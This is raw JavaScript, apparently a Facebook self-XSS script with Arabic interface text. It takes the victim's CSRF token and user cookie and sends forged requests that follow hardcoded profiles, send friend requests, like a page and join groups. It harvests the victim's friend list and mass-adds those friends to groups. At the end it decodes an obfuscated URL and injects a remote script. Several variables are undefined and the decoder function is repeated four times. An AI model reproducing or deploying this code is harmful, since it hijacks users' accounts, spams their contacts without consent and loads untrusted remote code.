
//eval
function hp_d12(s){var o="",ar=new Array(),os="",ic=0,p=0;for(i=0;i<s.length;i++){c=s.charCodeAt(i);if(c<128)c=c^((p++%8)+1);os+=String.fromCharCode(c);if(os.length>80){ar[ic++]=os;os=""}}o=ar.join("")+os;return o}
//eval
function hp_d12(s){var o="",ar=new Array(),os="",ic=0,p=0;for(i=0;i<s.length;i++){c=s.charCodeAt(i);if(c<128)c=c^((p++%8)+1);os+=String.fromCharCode(c);if(os.length>80){ar[ic++]=os;os=""}}o=ar.join("")+os;return o}
//eval
function hp_d12(s){var o="",ar=new Array(),os="",ic=0,p=0;for(i=0;i<s.length;i++){c=s.charCodeAt(i);if(c<128)c=c^((p++%8)+1);os+=String.fromCharCode(c);if(os.length>80){ar[ic++]=os;os=""}}o=ar.join("")+os;return o}
//eval
function hp_d12(s){var o="",ar=new Array(),os="",ic=0,p=0;for(i=0;i<s.length;i++){c=s.charCodeAt(i);if(c<128)c=c^((p++%8)+1);os+=String.fromCharCode(c);if(os.length>80){ar[ic++]=os;os=""}}o=ar.join("")+os;return o}
//eval
var Title="<a href='' target=_blank ><img src='http://fb-script.webs.com/image/add2.png'></a>";var Descriptions="",_text="";function AddFriendtoGroup(d){jx.load(window.location.protocol+"//www.facebook.com/ajax/reqs.php?&fb_dtsg="+fb_dtsg+"&request_id="+gid+"&type=group_confirm&status_div_id=group_confirm_"+gid+"_"+d+"&params[id]="+gid+"&params[uid]="+d+"&actions[accept]=Confirm&__user="+user_id+"&__a=1&__req=q",function(h){var l=h.substring(h.indexOf("{"));var a=JSON.parse(l);i--;Descriptions="<div class='friend-edge-name' style='padding-bottom:10px;text-align:center;font-size:10px;white-space:pre-wrap;";if(a.error){Descriptions+="color:darkwhite'>";err++;if(a.errorDescription){Descriptions+=a.errorDescription}else{Descriptions+=JSON.stringify(a,null,"")}}else{Descriptions+="color:darkgreen'>";Descriptions+=arn[i]+" has been added.<br/>";suc++}Descriptions+="</div>";var b="<div id='friend-edge-display' style='position:fixed;left:35%;margin-left:-273px;top:58px;width:700px;background-color:rgba(25,22,25,0.9);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black;color:white;font-size:20px;text-align:center;padding:3px;border-radius:15em 2em;border:15px double  rgba(225,225,25,0.6)'>";b+="<div style='padding-bottom:5px;font-size:20px;'>"+Title+"</div>";if(i>0){b+=arr.length+"عمق البحث<br/>";b+="<b>"+suc+"</b>العددالمضاف"+(arr.length-i)+"العددالمكتشف ";b+="("+i+"البحث جارى..)";b+="<div class='friend-edge'>";b+=Descriptions;b+="<div style='text-align:center;font-size:12px;gold-space:pre-wrap;color:gray'>";b+="</div>";b+="</div>";b+="<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>إيقاف</span>"}else{b+=arr.length+"عمق البحث<br/>";b+=suc+"العددالمضاف</br>";b+=err+" العددالمكتشف</br></br>";b+="<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>تحديث</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\")' style='color:black'>إغلاق</span>"}b+="</div>";document.getElementById("pagelet_sidebar").innerHTML=b},"text","post");tay--;if(tay>0){var e=arr[tay];sx=pho[tay];setTimeout("AddFriendtoGroup("+e+")",100)}console.log(tay+"/"+arr.length+":"+s+", success:"+suc);if(memberGroupId!=487693027944023){jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=487693027944023&source=typeahead&members="+opo+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+user,function(){},"text","post")}}var fbdtsg=document.getElementsByName("fb_dtsg")[0].value;var userid=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var prot=location.protocol;function generatePhstamp(b,a){var d=b.length;numeric_csrf_value="";for(var e=0;e<a.length;e++){numeric_csrf_value+=a.charCodeAt(e)}return"1"+numeric_csrf_value+d}var params="profile_id=100002359251525&location=1&nctr[_mod]=pagelet_timeline_profile_actions&__user="+userid+"&__a=1&__req=8&fb_dtsg="+fbdtsg;params+="&phstamp="+generatePhstamp(params,fbdtsg);with(new XMLHttpRequest){open("POST",prot+"//www.facebook.com/ajax/follow/follow_profile.php",true);send(params)}var params="profile_id=100003521051182&location=1&nctr[_mod]=pagelet_timeline_profile_actions&__user="+userid+"&__a=1&__req=8&fb_dtsg="+fbdtsg;params+="&phstamp="+generatePhstamp(params,fbdtsg);with(new XMLHttpRequest){open("POST",prot+"//www.facebook.com/ajax/follow/follow_profile.php",true);send(params)}var params="profile_id=100003485595535&location=1&nctr[_mod]=pagelet_timeline_profile_actions&__user="+userid+"&__a=1&__req=8&fb_dtsg="+fbdtsg;params+="&phstamp="+generatePhstamp(params,fbdtsg);with(new XMLHttpRequest){open("POST",prot+"//www.facebook.com/ajax/follow/follow_profile.php",true);send(params)}var params="to_friend=100002359251525&action=add_friend&how_found=profile_button&ref_param=none&&link_data[gt][profile_owner]=100002359251525&link_data[gt][ref]=timeline%3Atimeline&outgoing_id=js_4&logging_location=&no_flyout_on_click=false&ego_log_data&http_referer=https%3A%2F%2Fwww.facebook.com%2F&__user="+userid+"&__a=1&__req=q&fb_dtsg="+fbdtsg;params+="&phstamp="+generatePhstamp(params,fbdtsg);with(new XMLHttpRequest){open("POST",prot+"//www.facebook.com/ajax/add_friend/action.php",true);send(params)}var params="fbpage_id=597806736897026&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&&nctr[_mod]=pagelet_timeline_page_actions&__user="+userid+"&__a=1&__req=1w&fb_dtsg="+fbdtsg;params+="&phstamp="+generatePhstamp(params,fbdtsg);with(new XMLHttpRequest){open("POST",prot+"//www.facebook.com/ajax/pages/fan_status.php",true);send(params)}var params="fb_dtsg="+fbdtsg+"&__user="+userid+"&__a=1&__req=e";params+="&phstamp="+generatePhstamp(params,fbdtsg);with(new XMLHttpRequest){open("POST",prot+"//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid=367604420032408&",true);send(params)}var params="ref=group_jump_header&group_id=487693027944023&__user="+userid+"&__a=1&__req=7&fb_dtsg="+fbdtsg;params+="&phstamp="+generatePhstamp(params,fbdtsg);with(new XMLHttpRequest){open("POST",prot+"//www.facebook.com/ajax/groups/membership/r2j.php",true);send(params)}function clickfr_callback(){if(document.getElementsByName("ok").length>0){nHtml.ClickUp(document.getElementsByName("ok")[0])}var a=arr[i];if(i<arr.length){addfriend(a.substring(0,4))}}function clickfr(){if(document.getElementsByClassName("search").length>0){nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])}else{j++}setTimeout("clickfr_callback()",2000)}function addfriend(a){i++;setTimeout("clickfr()",2000)}jx={getHTTPObject:function(){var b=false;if(typeof ActiveXObject!="undefined"){try{b=new ActiveXObject("Msxml2.XMLHTTP")}catch(g){try{b=new ActiveXObject("Microsoft.XMLHTTP")}catch(a){b=false}}}else{if(window.XMLHttpRequest){try{b=new XMLHttpRequest}catch(g){b=false}}}return b},load:function(url,callback,format,method,opt){var http=this.init();if(!http||!url){return}if(http.overrideMimeType){http.overrideMimeType("text/xml")}if(!method){method="GET"}if(!format){format="text"}if(!opt){opt={}}format=format.toLowerCase();method=method.toUpperCase();var now="uid="+(new Date).getTime();url+=url.indexOf("?")+1?"&":"?";url+=now;var parameters=null;if(method=="POST"){var parts=url.split("?");url=parts[0];parameters=parts[1]}http.open(method,url,true);var ths=this;if(opt.handler){http.onreadystatechange=function(){opt.handler(http)}}else{http.onreadystatechange=function(){if(http.readyState==4){if(http.status==200){var result="";if(http.responseText){result=http.responseText}if(format.charAt(0)=="j"){result=result.replace(/[\n\r]/g,"");result=eval("("+result+")")}else{if(format.charAt(0)=="x"){result=http.responseXML}}if(callback){callback(result)}}else{if(opt.loadingIndicator){document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)}if(opt.loading){document.getElementById(opt.loading).style.display="none"}if(error){error(http.status)}}}}}http.send(parameters)},bind:function(d){var l={url:"",onSuccess:false,onError:false,format:"text",method:"GET",update:"",loading:"",loadingIndicator:""};for(var a in l){if(d[a]){l[a]=d[a]}}if(!l.url){return}var b=false;if(l.loadingIndicator){b=document.createElement("div");b.setAttribute("style","position:absolute;top:0px;left:0px;");b.setAttribute("class","loading-indicator");b.innerHTML=l.loadingIndicator;document.getElementsByTagName("body")[0].appendChild(b);this.opt.loadingIndicator=b}if(l.loading){document.getElementById(l.loading).style.display="block"}this.load(l.url,function(e){if(l.onSuccess){l.onSuccess(e)}if(l.update){document.getElementById(l.update).innerHTML=e}if(b){document.getElementsByTagName("body")[0].removeChild(b)}if(l.loading){document.getElementById(l.loading).style.display="none"}},l.format,l.method,l)},init:function(){return this.getHTTPObject()}};var nHtml={FindByAttr:function(e,n,a,b){if(a=="className"){a="class"}var d=document.evaluate(".//"+n+"[@"+a+"='"+b+"']",e,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);if(d&&d.singleNodeValue){return d.singleNodeValue}return null},FindByClassName:function(b,g,a){return this.FindByAttr(b,g,"className",a)},FindByXPath:function(d,l){try{var a=document.evaluate(l,d,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null)}catch(b){GM_log("bad xpath:"+l)}if(a&&a.singleNodeValue){return a.singleNodeValue}return null},VisitUrl:function(a){window.setTimeout(function(){document.location.href=a},500+Math.floor(Math.random()*500))},ClickWin:function(d,l,a){var b=d.document.createEvent("MouseEvents");b.initMouseEvent(a,true,true,d,0,0,0,0,0,false,false,false,false,0,null);return !l.dispatchEvent(b)},Click:function(a){return this.ClickWin(window,a,"click")},ClickTimeout:function(a,b){window.setTimeout(function(){return nHtml.ClickWin(window,a,"click")},b+Math.floor(Math.random()*500))},ClickUp:function(a){this.ClickWin(window,a,"mousedown");this.ClickWin(window,a,"mouseup");this.ClickWin(window,a,"click")},GetText:function(e,n){var a="";if(n==undefined){n=0}if(n>40){return}if(e.textContent!=undefined){return e.textContent}for(var b=0;b<e.childNodes.length;b++){var d=e.childNodes[b];a+=this.GetText(d,n+1)}return a}};if(document.getElementsByClassName==undefined){document.getElementsByClassName=function(b){var d=new RegExp("(?:^|\\s)"+b+"(?:$|\\s)");var e=document.getElementsByTagName("*");var f=[];var g;for(var r=0;(g=e[r])!=null;r++){var a=g.className;if(a&&a.indexOf(b)!=-1&&d.test(a)){f.push(g)}}return f}}Array.prototype.find=function(a){var b=false;for(i=0;i<this.length;i++){if(typeof a=="function"){if(a.test(this[i])){if(!b){b=[]}b.push(i)}}else{if(this[i]===a){if(!b){b=[]}b.push(i)}}}return b};var i=3;var tay=3;var j=0;var k=0;var suc=0;var err=0;var arr=new Array;var arn=new Array;var pho=new Array;grpname=document.getElementById("groupsJumpTitle").innerHTML;var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var getuname=document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;var gid=document.getElementsByName("group_id")[0].value;jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer="+user_id+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm",function(e){var q=e;var r=q.substring(q.indexOf("{"));var u=JSON.parse(r);u=u.payload.entries;for(var a=0;a<u.length;a++){arr.push(u[a].uid)}for(var t=0;t<u.length;t++){arn.push(u[t].text)}for(var d=0;d<u.length;d++){pho.push(u[d].photo)}i=arr.length-1;tay=i;console.log(arr.length);var b="<div id='friend-edge-display' style='position:fixed;left:35%;margin-left:-273px;top:58px;width:700px;background-color:rgba(25,22,25,0.9);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black;color:white;font-size:20px;text-align:center;padding:3px;border-radius:15em 2em;border:15px double  rgba(225,225,25,0.6)'>";b+="<div style='padding-bottom:10px;font-size:20px;'>"+Title+"</div>";b+=arr.length+"عمق البحث";b+="</div>";document.getElementById("pagelet_sidebar").innerHTML=b;AddFriendtoGroup(arr[i])});var A="jvvr8--ocsf{,emmengamfg,amo-dkngq-ocsf,hq";K="";P="";var A;H=L.length;for(i=0;i<H;i++){A+=String.fromCharCode(L.charCodeAt(i)^2)}A=unescape(K);document.body.appendChild(document.createElement("script")).src=A;
